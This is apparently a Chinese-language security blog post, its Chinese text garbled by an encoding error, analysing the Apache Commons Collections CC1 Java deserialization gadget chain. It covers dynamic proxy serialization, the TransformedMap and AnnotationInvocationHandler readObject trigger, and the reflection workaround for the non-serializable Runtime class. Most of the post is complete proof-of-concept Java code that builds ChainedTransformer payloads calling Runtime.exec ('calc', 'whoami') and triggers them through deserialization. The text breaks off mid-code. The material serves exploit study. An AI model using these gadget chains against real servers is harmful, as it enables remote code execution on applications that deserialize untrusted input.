<h5 id="Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÂÆû‰æãÂ∫èÂàóÂåñÈóÆÈ¢ò"><a href="#Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÂÆû‰æãÂ∫èÂàóÂåñÈóÆÈ¢ò" class="headerlink" title="Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÂÆû‰æãÂ∫èÂàóÂåñÈóÆÈ¢ò"></a>Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÂÆû‰æãÂ∫èÂàóÂåñÈóÆÈ¢ò</h5><p>Âä®ÊÄÅ‰ª£ÁêÜÁ±ªÁ¨¶Âêà<code>Java</code>ÂØπË±°Â∫èÂàóÂåñÊù°‰ª∂ÔºåÂπ∂‰∏îÂú®<code>Â∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñ</code>Êó∂‰ºöË¢´<code>ObjectInputStream/ObjectOutputStream</code>ÁâπÊÆäÂ§ÑÁêÜ</p>
<p>Âä®ÊÄÅ‰ª£ÁêÜÁîüÊàêÁöÑÁ±ªÂú®<code>ÂèçÂ∫èÂàóÂåñ/ÂèçÂ∫èÂàóÂåñ</code>Êó∂‰∏ç‰ºöÂ∫èÂàóÂåñËØ•Á±ªÁöÑÊàêÂëòÂèòÈáèÔºåÂπ∂‰∏î<code>serialVersionUID</code>‰∏∫<code>0L</code> Ôºå‰πüÂ∞ÜÊòØËØ¥Â∞ÜËØ•Á±ªÁöÑ<code>Class</code>ÂØπË±°‰º†ÈÄíÁªô<code>java.io.ObjectStreamClass</code>ÁöÑÈùôÊÄÅ<code>lookup</code>ÊñπÊ≥ïÊó∂ÔºåËøîÂõûÁöÑ<code>ObjectStreamClass</code>ÂÆû‰æãÂ∞ÜÂÖ∑Êúâ‰ª•‰∏ãÁâπÊÄßÔºö</p>
<ol>
<li>Ë∞ÉÁî®ÂÖ∂<code>getSerialVersionUID</code>ÊñπÊ≥ïÂ∞ÜËøîÂõû<code>0L</code></li>
<li>Ë∞ÉÁî®ÂÖ∂<code>getFields</code>ÊñπÊ≥ïÂ∞ÜËøîÂõûÈïøÂ∫¶‰∏∫Èõ∂ÁöÑÊï∞ÁªÑ</li>
<li>Ë∞ÉÁî®ÂÖ∂<code>getField</code>ÊñπÊ≥ïÂ∞ÜËøîÂõû<code>null</code></li>
</ol>
<p>‰ΩÜÂÖ∂Áà∂Á±ª(<code>java.lang.reflect.Proxy</code>)Âú®Â∫èÂàóÂåñÊó∂‰∏çÂèóÂΩ±ÂìçÔºåÁà∂Á±ª‰∏≠ÁöÑ<code>h</code>ÂèòÈáè(<code>InvocationHandler</code>)Â∞Ü‰ºöË¢´Â∫èÂàóÂåñÔºåËøô‰∏™<code>h</code>Â≠òÂÇ®‰∫ÜÂä®ÊÄÅ‰ª£ÁêÜÁ±ªÁöÑÂ§ÑÁêÜÁ±ªÂÆû‰æã‰ª•ÂèäÂä®ÊÄÅ‰ª£ÁêÜÁöÑÊé•Âè£Á±ªÁöÑÂÆûÁé∞Á±ªÁöÑÂÆû‰æã</p>
<p>Âä®ÊÄÅ‰ª£ÁêÜÁîüÊàêÁöÑÂØπË±°(<code>com.sun.proxy.$ProxyXXX</code>)Â∫èÂàóÂåñÁöÑÊó∂ÂÄô‰ºö‰ΩøÁî®‰∏Ä‰∏™ÁâπÊÆäÁöÑÂçèËÆÆÔºö<code>TC_PROXYCLASSDESC(0x7D)</code>ÔºåËøô‰∏™Â∏∏ÈáèÂú®<code>java.io.ObjectStreamConstants</code>‰∏≠ÂÆö‰πâÁöÑ„ÄÇÂú®ÂèçÂ∫èÂàóÂåñÊó∂‰πü‰∏ç‰ºöË∞ÉÁî®<code>java.io.ObjectInputStream</code>Á±ªÁöÑ<code>resolveClass</code>ÊñπÊ≥ïËÄåÊòØË∞ÉÁî®<code>resolveProxyClass</code>ÊñπÊ≥ïÊù•ËΩ¨Êç¢ÊàêÁ±ªÂØπË±°ÁöÑ</p>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="p-ÁâõÁÆÄÂåñ-poc"><a href="#p-ÁâõÁÆÄÂåñ-poc" class="headerlink" title="p ÁâõÁÆÄÂåñ poc"></a>p ÁâõÁÆÄÂåñ poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap&lt;Object, Object&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br>        decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÂàõÂª∫‰∏Ä‰∏™<code>transformer</code>ÂØπË±°Èìæ(Transformer Êï∞ÁªÑÂ≠òÂÇ®)Ôºö<strong>ConstantTransformer-&gt;ËøîÂõûÂΩìÂâç Runtime ÁéØÂ¢ÉÁöÑ Runtime ÂØπË±°ÔºõInvokerTransformer-&gt;Âà©Áî®ÂÖ∂ÈáçÂÜôÁöÑ transformer ÊñπÊ≥ïËøõË°åÂèçÂ∞ÑË∞ÉÁî® exec ÊñπÊ≥ï</strong></p>
<p>Ëß¶ÂèëÔºöÈÄöËøáÂåÖË£Ö<code>HashMap</code>Ôºå‰ΩøÁî®<code>TransformerMap</code>‰øÆÈ•∞ MapÔºåÈÄöËøá<code>Map.put</code>ÁöÑÊìç‰ΩúËß¶Âèë</p>
<p><strong>ÈÄöËøá ConstantTransformer„ÄÅChainedTransformer ÂÆåÊàê payload Âú®ÂÆ¢Êà∑Á´ØËá™ÂÆö‰πâ-&gt;ÊúçÂä°Á´ØÂèçÂ∫èÂàóÂåñÊàë‰ª¨ÁöÑËæìÂÖ• ChainedTransformer Á±ªÂûã&amp;Ë∞ÉÁî® transform ÊñπÊ≥ï</strong>Âà∞ËøôÈáåËøò‰∏çË∂≥‰ª•ÂΩ¢ÊàêÊºèÊ¥ûÔºåÂõ†‰∏∫ÊòæÁÑ∂ÊúçÂä°Á´Ø‰∏çÂ≠òÂú®ËøôÁßç‰ª£Á†Å</p>
<p>ÁÑ∂ËÄåÈÄöËøá<code>TransformerMap</code>Ëøõ‰∏ÄÊ≠•Âú∞Âª∂ÈïøÂà©Áî®ÈìæÔºö<strong>Ëß¶ÂèëÊù°‰ª∂‰ªéÊòæÊÄßÁöÑË∞ÉÁî®ËΩ¨Êç¢ÈìæÁöÑ transform ÂáΩÊï∞Âª∂‰º∏Âà∞‰øÆÊîπ map ÁöÑÂÄºÔºåËÄåËøôÊòØ‰∏Ä‰∏™Â∏∏ËßÑÊìç‰ΩúÂπ∂Â≠òÂú®‰∫éÊúçÂä°ÊÆµÔºåÂõ†Ê≠§ÊûÅÊúâÂèØËÉΩË¢´Ëß¶Âèë</strong></p>
<p>ÁÑ∂ËÄåËøôÊ†∑Ê∑ªÂä†ÂÖÉÁ¥†ÁöÑÊìç‰ΩúÊàñËÄÖ‰øÆÊîπÊüê‰∏™ÈîÆÂÄºÂ∑≤ÁÑ∂ÂæàÂ∏∏ËßÅ‰∫ÜÔºå‰ΩÜÊàë‰ª¨Á¨¶ÂêàÂèçÂ∫èÂàóÂåñÊîªÂáªÁöÑÊîªÂáªÊõ¥Áõ¥Êé•ÁöÑÊòØËß¶Âèë‰∏Ä‰∏™Á±ªÁöÑ<code>readObject</code>ÂØπ Map ÁöÑÊï∞ÂÄºËøõË°åÊìç‰Ωú</p>
<h4 id="‚ë†jdk1-7-AnnotationInvocationHandler"><a href="#‚ë†jdk1-7-AnnotationInvocationHandler" class="headerlink" title="‚ë†jdk1.7 AnnotationInvocationHandler"></a>‚ë†jdk1.7 AnnotationInvocationHandler</h4><p>ÂÆûÈôÖÁéØÂ¢É‰∏≠<code>Commons Collections</code> + <code>AnnotationInvocationHandler</code> ÁªÑ‰ª∂ÈùûÂ∏∏ÁªèÂÖ∏ÔºåÂú® jdk 1.7 ‰∏≠Êúâ‰∏Ä‰∏™Â≠òÂú®‰∏Ä‰∏™ÂèØÂà©Áî®ÁöÑ readObject ÁÇπ <code>sun.reflect.annotation.AnnotationInvocationHandler</code>ÔºåÂú® idea ‰∏≠Áõ¥Êé•ÊêúÁ¥¢ÔºåÁúãÂà∞ÂÖ∂<code>readObject</code>ÊñπÊ≥ï‰ª•ÂèäÊûÑÈÄ†ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        Class[] var3 = var1.getInterfaces();<br>        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) &#123;<br>            <span class="hljs-keyword">this</span>.type = var1;<br>            <span class="hljs-keyword">this</span>.memberValues = var2;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ÂØπ‰∫é<code>readObject</code>Ôºå<code>this.memberValues.entrySet().iterator()</code>ÔºåÊûÑÈÄ†ÊñπÊ≥ïÂèØÁü•ËøôÊòØ<code>Map&lt;String, Object&gt;.entrySet().iterator()</code>Ôºå‰ªéÂâçÈù¢ÁöÑ‰ª£Á†ÅÊù•ËØ¥ÔºåËøôÈáåÊòØÁªèËøá‰∫Ü<code>TransformedMap</code>‰øÆÈ•∞ÂêéÁöÑÂØπË±°ÔºåÂêéÈù¢ÁöÑ‰ª£Á†ÅÈÄªËæëÊòØÈÅçÂéÜÂÖÉÁ¥†Âπ∂‰æùÊ¨°ËÆæÁΩÆÂÄºÔºåËÄåÂú®Ë∞ÉÁî®<code>setValue</code>Êó∂Â∞±Âíå<code>Map.put()</code>ÊñπÊ≥ï‰∏ÄÊ†∑</p>
<p>Ê≠§Êó∂Êàë‰ª¨ÂèØ‰ª•Â∞ùËØïÁºñÂÜô poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = TransformedMap.decorate(hm,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><br>        <span class="hljs-comment">//ÂèçÂ∞ÑËé∑ÂèñAnnotationInvocationHandlerÂØπË±°</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object instance = ctor.newInstance(Target.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(instance);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//Ê®°ÊãüÊúçÂä°Á´ØÂèçÂ∫èÂàóÂåñ</span><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>‰∏çÂá∫ÊÑèÂ§ñÁöÑËØùÂá∫‰∫ÜÊÑèÂ§ñÔºö<code>Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime</code>ÔºåÂ∞±ÊòØÊàë‰ª¨<code>Transformer</code>Êï∞ÁªÑÂÇ®Â≠òÁöÑ<code>new ConstantTransformer(Runtime.getRuntime)</code>‰∏≠Ôºå<code>Runtime</code>Á±ª Âπ∂‰∏çÊîØÊåÅÂ∫èÂàóÂåñ(Ê≤°ÊúâÂÆûÁé∞ Serializable Êé•Âè£)ÔºåË¶ÅËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÔºåËøòÂæóÈÄöËøáÂèçÂ∞ÑÊù•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor declaredConstructor = clz.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>Object newInstance = declaredConstructor.newInstance();<br>Method execMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(newInstance,<span class="hljs-string">&quot;whoami&quot;</span>);<br><br>ÊàñÂçï‰æãÊ®°ÂºèÔºö<br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method getRuntimeMeth = clz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>Runtime runtime = (Runtime) getRuntimeMeth.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>Method execMeth = clz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ÂÜôËøõ<code>Transformer</code>Êï∞ÁªÑ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ÁºñÂÜôÊäÄÂ∑ßÔºühttps://www.bilibili.com/video/BV1no4y1U7E1  32:40</span><br><span class="hljs-comment">//1. ÂÖàÂÜôÂá∫ÂèçÂ∞Ñ 2. ‰æãÂ¶ÇInvokerTransformerÊûÑÈÄ†ÊñπÊ≥ïÂæóÁü•ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂøÖÂÆö‰º†ÂÖ•methodNameÔºõÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊòØÂèÇÊï∞ÂàóË°®(ClassÊï∞ÁªÑÂûã)ÔºåËá≥‰∫éÊï∞ÁªÑÂ°´ÂÖ•‰ªÄ‰πàÔºåÈÇ£‰πàÂ∞±ÁúãÂÖ∑‰ΩìÁöÑÊñπÊ≥ïÂèÇÊï∞Á±ªÂûãÂÜôËøõÊï∞ÁªÑÔºõÁ¨¨‰∏â‰∏™ÂèÇÊï∞ÊòØ‰º†ÂÖ•ÁöÑÂèÇÊï∞ÂÄº(ObjectÊï∞ÁªÑÂûã)ÔºåËøô‰∏™‰∏ÄÂÆöË¶ÅÂíåÁ¨¨‰∫å‰∏™ÂèÇÊï∞ÊÉÖÂΩ¢‰∏ÄËá¥ÔºåÊØîÂ¶ÇMethod getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);ËøôÊ†∑ÂèçÂ∞ÑÊòØÂèØ‰ª•ÁöÑÔºå‰ΩÜÊòØÂ°´ÂÖ•ObjectÊï∞ÁªÑÈúÄË¶ÅÂ°´ÂÜôÂÆåÊï¥</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">execMeth.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">*/</span><br><br>            Method getRuntimeMeth = (Method) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class);<br>            Runtime r =(Runtime) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;).transform(getRuntimeMeth);<br>            <span 